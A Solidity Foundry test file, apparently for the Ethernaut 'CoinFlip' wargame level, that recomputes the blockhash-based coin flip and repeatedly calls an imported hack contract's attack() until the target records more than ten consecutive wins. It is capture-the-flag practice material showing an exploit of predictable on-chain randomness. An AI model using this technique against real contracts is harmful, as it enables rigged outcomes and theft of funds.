// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import '../lib/forge-std/src/Test.sol';
import '../script/CoinFlipScript.s.sol';

 interface ICoinFlip {
  function consecutiveWins() external view returns (uint);
  function flip(bool _guess) external;
}

  contract CoinFlipTest is Test {
   ICoinFlip target = ICoinFlip(0x5Edfa60b4f904595D8d7d3907D16675E4cfEf819);
   CoinFlipScript hack = new CoinFlipScript();

    function test () external {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        address alice = vm.addr(1);
        vm.deal(alice, 1 ether);
        for (uint256 i = 0; target.consecutiveWins() <= 10; i++) {
          vm.roll(10 + i);
          vm.prank(alice);
          hack.attack();
          console.log("wins: ", target.consecutiveWins());
        }

    }
  }
